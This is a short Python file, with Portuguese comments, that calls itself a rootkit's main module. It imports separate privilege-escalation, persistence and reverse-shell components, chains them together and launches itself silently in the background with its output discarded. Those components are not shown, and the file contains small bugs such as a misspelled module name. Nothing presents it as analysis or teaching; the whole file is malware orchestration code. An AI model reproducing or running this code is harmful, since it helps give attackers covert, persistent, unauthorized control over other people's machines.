#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import socket
import subprocess
import string
import time
import random as r
import sys
import subprocess
import ctypes
import threading

# Importando outros rookit 
sys.path.append('./src/')

# rootkit - Privilege escalation
from privilege_scalation import elevar_privilegio

# rootkit - Persistence
from persistence import get_persistence

# Reverse shell
from reverse_shell import remote_shell

# Função para verificar se o usuário é root
def check_root():
    return os.geteuid() == 0

# Função principal rootkit 
def rootkit_main(): 
    elevar_privilegio()
    remote_shell()
    get_persistence()

# Função para iniciar o rootkit em segundo plano
def rootkit_init():
    subprocess.Popen(["python3", "-c", "from rookit import rootkit_main; rootkit_main()"],
                     stdout=open(os.devnull, 'w'),
                     stderr=open(os.devnull, 'w'),
                     close_fds=True)

if __name__ == "__main__":
    rootkit_init()

rootkit_main()
#get_persistence()